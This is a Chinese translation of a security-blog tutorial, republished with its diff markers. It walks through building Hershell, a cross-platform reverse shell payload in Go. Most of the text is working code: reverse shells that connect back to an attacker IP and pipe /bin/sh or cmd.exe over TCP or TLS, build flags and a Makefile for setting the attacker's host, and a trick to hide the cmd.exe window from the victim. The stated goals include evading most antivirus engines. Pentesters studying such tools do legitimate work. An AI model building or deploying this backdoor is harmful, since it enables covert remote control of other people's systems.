@@ -1,0 +1,535 @@
+# Hershell：献给渗透测试人员的礼物
+
+阅读量 **233444**
+
+|评论 **2**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2018-01-17 13:59:52
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章原作者 sysdream，文章来源：sysdream.com
+
+原文地址：<https://sysdream.com/news/lab/2018-01-15-en-golang-for-pentests-hershell/>
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p0.ssl.qhimg.com/t01308e66504378c804.png)
+
+## 介绍
+
+在渗透测试领域中，研究人员们必备的工具毫无疑问就是Metasploit了。Metasploit中包含了大量功能丰富的Payload、编码器、以及其他的实用工具。光是Meterpreter就提供了其中绝大多数的Payload，Meterpreter是一种修改后的Shell，包含了很多漏洞利用命令以及后渗透攻击命令。由于它具备了强大的攻击功能，它可能是研究人员以及网络攻击这最常用的工具了。
+
+## Meterpreter的问题
+
+但不幸的是，它的热门程度也给它自己带来了不小的麻烦：绝大多数的反病毒产品以及基于签名的安全解决方案都可以检测到它。而在渗透测试过程中，包含了Meterpreter
+Payload的代码一般都会被检测到。
+
+另一个问题就是它缺乏针对特定架构（例如BSD）的支持，这也就意味着，我们不得不开发自己所要使用的后门。
+
+因此，上述的这些问题推动着我们开发出了Hershell。这个项目的目标是为了给大家提供一个反向Shell
+Payload，并且提供了跨平台支持，除此之外，它也不会被反病毒软件检测到。
+
+该工具采用Go语言开发，即Google推出的一种编译语言。
+
+## 为什么是Go？
+
+实际上在安全社区里，就目前来说Python肯定是制作脚本的首选编程语言，有时我们甚至还会用Python来开发应用程序。既然如此，那我们为什么要学习新的编程语言呢？
+
+Go语言也有其自身的优势，这种特性允许开发人员在无需实现任何外部依赖的情况下执行交叉编译。除此之外，Go提供了一种标准代码库，其中包含了所有需要在目标架构中运行的代码。因此，在Go语言的帮助下，开发人员应该能够轻松地开发出适用于各种平台的脚本代码。
+
+## 目标
+
+在开发这个项目的过程中，我们想要实现的目标如下：
+
+  1. 制作一个功能类似反向Shell的Payload；
+  2. 得到一种能够跨平台以及硬件架构（Windows、Linux、macOS和ARM）运行的Payload；
+  3. 易于配置；
+  4. 加密通信；
+  5. 能绕过绝大多数的反病毒检测引擎；
+
+## 准备环境准备环境
+
+从官方网站下载Go语言环境的安装包：【传送门】
+
+安装完成之后，我们需要配置好开发环境。我们需要创建一个根目录（dev文件夹），并用它来保存资源文件和代码库，并构建代码：
+
+    
+    
+    $ mkdir -p $HOME/dev/{src,bin,pkg}
+    $ export GOPATH=$HOME/dev
+    $ cd dev
+
+目录模式如下：
+
+  1. bin目录中包含了编译后的代码以及其他可执行文件；
+  2. pkg目录中包含了Go数据包的对象文件；
+  3. src目录中包含了开发的应用程序以及下载数据包的资源目录；
+
+## 我的第一个反向Shell
+
+那么接下来，我们一起用Go语言来创建一个简单的TCP反向Shell。
+
+这里我们就不用一行一行去给大家进行演示了，下面给出的是一份带有注释的完整代码版本：
+
+    
+    
+    // filename: tcp.go
+    
+    package main
+    
+    import (
+    “net” // requirement to establish a connection
+    “os” // requirement to call os.Exit()
+    “os/exec” // requirement to execute commands against the target system
+    )
+    
+    func main() {
+    // Connecting back to the attacker
+    // If it fails, we exit the program
+    conn, err := net.Dial(“tcp”, “192.168.0.23:2233”)
+    if err != nil {
+    os.Exit(1)
+    }
+    // Creating a /bin/sh process
+    cmd := exec.Command(“/bin/sh”)
+    // Connecting stdin and stdout
+    // to the opened connection
+    cmd.Stdin = conn
+    cmd.Stdout = conn
+    cmd.Stderr = conn
+    // Run the process
+    cmd.Run()
+    }
+
+首先，我们使用net.Dial跟远程服务器建立了一条通信链接。
+
+Go标准件库的net数据包是基于TCP或UDP实现的网络通信抽象层。
+
+为了了解更多关于数据包使用的内容，Go语言的文档（go doc）给我们提供了很大的帮助：
+
+    
+    
+    $ go doc net
+    
+    package net // import “net”
+    
+    Package net provides a portable interface for network I/O, including TCP/IP,
+    UDP, domain name resolution, and Unix domain sockets.
+    
+    Although the package provides access to low-level networking primitives,
+    most clients will need only the basic interface provided by the Dial,
+    Listen, and Accept functions and the associated Conn and Listener
+    interfaces. The crypto/tls package uses the same interfaces and similar Dial
+    and Listen functions.
+
+我们回到脚本的开发过程中
+
+当连接建立成功之后（如果不成功，则程序终止运行），我们会使用exec.Command函数创建了一个进程。所有的输入和输出（stdout、stdin和stderr）都会被重定向到链接上，而此时进程将会被启动。
+
+接下来，我们就可以编译并执行文件了：
+
+    
+    
+    $ go build tcp.go
+    $ ./tcp
+
+现在，我们需要启动监听器：
+
+    
+    
+    # Listening server (attacker)
+    $ ncat -lvp 2233
+    Listening on [0.0.0.0] (family 0, port 2233)
+    Connection from 192.168.0.20 38422 received!
+    id
+    uid=1000(lab) gid=100(users) groupes=100(users)`
+
+正如你所见，我们如期得到了反向Shell。
+
+目前来说还没有什么特殊的，因为我们的目标还没有完全实现。
+
+## 配置
+
+既然我们现在已经有了反向Shell的基础代码了，但是我们还需要在每一次编译之前对代码进行修改，因为我们还要定义攻击者的监听端口以及IP地址。
+
+这就非常不方便了，但是我们这里可以使用一个小技巧：在链接时定义变量（在编译之前）。
+
+实际上，我们还可以在构建代码的过程中定义某些变量的值（使用go build命令）。
+
+下面给出的是之前的代码样本：
+
+    
+    
+    // filename: tcp.go
+    
+    package main
+    
+    import (
+    “net”
+    “os”
+    “os/exec”
+    )
+    
+    // variable to be defined at compiling time
+    var connectString string
+    
+    func main() {
+    if len(connectString) == 0 {
+    os.Exit(1)
+    }
+    conn, err := net.Dial(“tcp”, connectString)
+    if err != nil {
+    os.Exit(1)
+    }
+    cmd := exec.Command(“/bin/sh”)
+    cmd.Stdin = conn
+    cmd.Stdout = conn
+    cmd.Stderr = conn
+    cmd.Run()
+    }
+
+我们只是添加了下面这行代码：var connectString string这份代码可以按照如下方式进行编译：
+
+    
+    
+    $ go build —ldflags “-X main.connectString=192.168.0.23:2233” tcp.go
+
+这样一来，攻击者的IP地址以及端口号就可以在构建代码的过程中进行动态定义了。
+
+需要注意的是，这些变量是可以通过package.nomVariable来访问的，而且这些变量必须是string类型。
+
+为了让编译更加容易实现，我们可以创建一个Makefile：
+
+    
+    
+    # Makefile
+    SOURCE=tcp.go
+    BUILD=go build
+    OUTPUT=reverse_shell
+    LDFLAGS=—ldflags “-X main.connectString=${LHOST}:${LPORT}”
+    
+    all:
+    ${BUILD} ${LDFLAGS} -o ${OUTPUT} ${SOURCE}
+    
+    clean:
+    rm -f ${OUTPUT}
+
+接下来，我们将使用LHOST以及LPORT环境变量来定义设置信息：
+
+    
+    
+    $ make LHOST=192.168.0.23 LPORT=2233
+    go build —ldflags “-X main.connectString=192.168.0.23:2233” -o reverse_shell tcp.go
+
+## 跨平台实现
+
+既然我们可以轻松配置我们的Payload，那么接下来就是要想办法实现跨平台了。
+
+正如我们之前所说的，这也是我们选择Go语言的原因，因为它只需要一份相同的基础代码，就能够适用于各种架构以及平台。
+
+简而言之，runtime数据包提供了GOOS以及GOARCH变量。
+
+接下来，我们一起看一看GOOS的使用方法。
+
+    
+    
+    // filename: tcp_multi.go
+    
+    package main
+    
+    import (
+    “net”
+    “os”
+    “os/exec”
+    “runtime” // requirement to access to GOOS
+    )
+    
+    var connectString string
+    
+    func main() {
+    var cmd *exec.Cmd
+    if len(connectString) == 0 {
+    os.Exit(1)
+    }
+    conn, err := net.Dial(“tcp”, connectString)
+    if err != nil {
+    os.Exit(1)
+    }
+    
+    switch runtime.GOOS {
+    case "windows":
+        cmd = exec.Command("cmd.exe")
+    case "linux":
+        cmd = exec.Command("/bin/sh")
+    case "freebsd":
+        cmd = exec.Command("/bin/csh")
+    default:
+        cmd = exec.Command("/bin/sh")
+    }
+    cmd.Stdin = conn
+    cmd.Stdout = conn
+    cmd.Stderr = conn
+    cmd.Run()
+    }
+
+很明显，我们在这里添加了一个switch条件来处理GOOS不同的值。因此，我们可以直接检查不同操作系统平台的值，并针对平台情况来修改目标进程。
+
+需要注意的是，上述代码还可以进一步简化，因为/bin/sh目录一般不会出现在Windows操作系统之中：
+
+    
+    
+    switch runtime.GOOS {
+    case “windows”:
+    // Windows specific branch
+    cmd = exec.Command(“cmd.exe”)
+    default:
+    // any other OS
+    cmd = exec.Command(“/bin/sh”)
+    }
+
+现在，我们还要使用GOARCH来处理交叉编译：
+
+    
+    
+    $ make GOOS=windows GOARCH=amd64 LHOST=192.168.0.23 LPORT=2233
+    go build —ldflags “-X main.connectString=192.168.0.23:2233” -o reverse_shell tcp_multi.go
+    $ file reverse_shell
+    reverse_shell: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows
+
+## 网络加密
+
+现在，我们看一看如何实现网络流量的加密。
+
+我们现在有下列选项可以选择：
+
+  1. 使用现成的方法在应用层实现加密；
+  2. 在会话层使用常见的经过测试的协议来实现加密（TLS）；
+
+出于简单和安全这两个角度来考虑，我们选择TLS，因为它可以用Go语言轻松实现，而且其标准代码库已经完全支持启用TLS了。
+
+在客户端方面，我们还需要一种新的&tls.Config类型对象来配置通信链接，例如证书绑定等等。
+
+下面给出的是经过优化并配置了TLS的新的基础代码：
+
+    
+    
+    import (
+    “crypto/tls”
+    “runtime”
+    “os”
+    “os/exec”
+    “net”
+    )
+    
+    var connectString string
+    
+    func GetShell(conn net.Conn) {
+    var cmd *exec.Cmd
+    switch runtime.GOOS {
+    case “windows”:
+    cmd = exec.Command(“cmd.exe”)
+    default:
+    cmd = exec.Command(“/bin/sh”)
+    }
+    cmd.Stdout = conn
+    cmd.Stderr = conn
+    cmd.Stdin = conn
+    cmd.Run()
+    }
+    
+    func Reverse(connectString string) {
+    var (
+    conn tls.Conn
+    err error
+    )
+    // Creation of the tls.Config object
+    // Accepting any* server certificate
+    config := &tls.Config{InsecureSkipVerify: true}
+    if conn, err = tls.Dial(“tcp”, connectString, config); err != nil {
+    os.Exit(-1)
+    }
+    defer conn.Close()
+    // Starting the shell
+    GetShell(conn)
+    }
+    
+    func main() {
+    if len(connectString) == 0 {
+    os.Exit(1)
+    }
+    Reverse(connectString)
+    }
+
+正如之前所说的那样，创建一个TLS套接字跟创建一个简单的TCP套接字其实是非常相似的，而且tls.Conn对象跟net.Coon的使用模式基本相同。
+
+## 条件编译
+
+正如之前所示，我们可以根据目标操作系统来修改程序的执行方式。但是，如果你想尝试使用这份代码的话，你就会发现一个问题。cmd.exe窗口并不会隐藏，而是直接弹出来了，而这就会引起目标用户的怀疑。
+
+幸运的是，exec.Cmd对象的SysProcAttr选项能够改变这种行为方式，正如文档库中所介绍的那样：
+
+    
+    
+    $ go doc exec.Cmd
+    ...
+    // SysProcAttr holds optional, operating system-specific attributes.
+    // Run passes it to os.StartProcess as the os.ProcAttr's Sys field.
+    SysProcAttr *syscall.SysProcAttr
+    ...
+
+在Linux下，我们从syscall.SysProcAttr模块的文档中获取到了下列信息：
+
+    
+    
+    $ go doc syscall.SysProcAttr
+    type SysProcAttr struct {
+    Chroot string // Chroot.
+    Credential *Credential // Credential.
+    Ptrace bool // Enable tracing.
+    Setsid bool // Create session.
+    Setpgid bool // Set process group ID to Pgid, or, if Pgid == 0, to new pid.
+    Setctty bool // Set controlling terminal to fd Ctty (only meaningful if Setsid is set)
+    Noctty bool // Detach fd 0 from controlling terminal
+    Ctty int // Controlling TTY fd
+    Foreground bool // Place child's process group in foreground. (Implies Setpgid. Uses Ctty as fd of controlling TTY)
+    Pgid int // Child's process group ID if Setpgid.
+    Pdeathsig Signal // Signal that the process will get when its parent dies (Linux only)
+    Cloneflags uintptr // Flags for clone calls (Linux only)
+    Unshareflags uintptr // Flags for unshare calls (Linux only)
+    UidMappings []SysProcIDMap // User ID mappings for user namespaces.
+    GidMappings []SysProcIDMap // Group ID mappings for user namespaces.
+    // GidMappingsEnableSetgroups enabling setgroups syscall.
+    // If false, then setgroups syscall will be disabled for the child process.
+    // This parameter is no-op if GidMappings == nil. Otherwise for unprivileged
+    // users this should be set to false for mappings work.
+    GidMappingsEnableSetgroups bool
+    }
+
+修改后的代码如下：
+
+    
+    
+    ...
+    switch runtime.GOOS {
+    case "windows":
+    cmd := exec.Cmd("cmd.exe")
+    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+    default:
+    cmd := exec.Cmd("/bin/sh")
+    }
+    ...
+
+不过上述代码还不适用于Windows以外的平台，因为syscall/exec_linux.go中并没有HideWindows属性。
+
+因此，我们还需要使用条件编译来调整我们的项目代码。
+
+比如说，如果我们想要针对Windows平台来编译源文件，我们就要添加下列代码：
+
+    
+    
+    // +build windows !linux !darwin !freebsd
+    
+    import net
+    …
+
+项目结构如下所示：
+
+    
+    
+    $ tree
+    ├── hershell.go
+    ├── Makefile
+    ├── README.md
+    └── shell
+    ├── shell_default.go
+    └── shell_windows.go
+
+其中，hershell.go中包含了程序的核心代码。接下来，我们需要创建一个名叫shell的模块，其中包含有针对Linux和Unix的shell_default.go文件以及针对Windows的shell_windows.go文件。
+
+## 证书绑定
+
+使用TLS来加密通信链接其实是非常好的，但如果没有对服务器进行认证的话，流量仍然有可能被“中间人攻击“等方式拦截到的。
+
+为了防止这种攻击的发生，我们需要对服务器提供的证书进行验证，即所谓的“证书绑定“。
+
+下列函数实现了这种功能：
+
+    
+    
+    func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
+    valid := false
+    connState := conn.ConnectionState()
+    for _, peerCert := range connState.PeerCertificates {
+    hash := sha256.Sum256(peerCert.Raw)
+    if bytes.Compare(hash[0:], fingerprint) == 0 {
+    valid = true
+    }
+    }
+    return valid, nil
+    }
+
+我们只需要在程序与远程服务器进行连接时调用这份代码即可，如果证书无效的话，连接将会被关闭：
+
+    
+    
+    func Reverse(connectString string, fingerprint []byte) {
+    var (
+    conn *tls.Conn
+    err error
+    )
+    config := &tls.Config{InsecureSkipVerify: true}
+    if conn, err = tls.Dial(“tcp”, connectString, config); err != nil {
+    os.Exit(ERR_HOST_UNREACHABLE)
+    }
+    
+        defer conn.Close()
+    
+        // checking the certificate fingerprint
+        if ok, err := CheckKeyPin(conn, fingerprint); err != nil || !ok {
+                os.Exit(ERR_BAD_FINGERPRINT)
+        }
+        RunShell(conn)
+    }
+
+## 总结
+
+本文的目标是给大家展示Go语言提供给我们的实用性以及便捷性。它不仅提供了跨平台特性，而且还整合了大量实用工具。除此之外，社区还有大量的数据包以及代码库可以使用，这一点是本文没有提到的。
+
+你可以在我们的GitHub代码库【传送门】获取本项目的完整源代码，如果你有任何问题的话，欢迎在GitHub上留言。
+
+本文翻译自sysdream.com [原文链接](https://sysdream.com/news/lab/2018-01-15-en-golang-for-pentests-hershell/)。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **WisFree** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/95090](/post/id/95090)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: [sysdream.com](https://sysdream.com/news/lab/2018-01-15-en-golang-for-pentests-hershell/)
+
+如若转载,请注明出处： <https://sysdream.com/news/lab/2018-01-15-en-golang-for-pentests-hershell/>
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [反病毒](/tag/反病毒)
+  * [Shell](/tag/Shell)
+  * [Go](/tag/Go)
+
+ **+1** __0赞
+
+ __收藏
+
+![](https://p5.ssl.qhimg.com/t014c3fa13dce6c85dd.png) WisFree
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
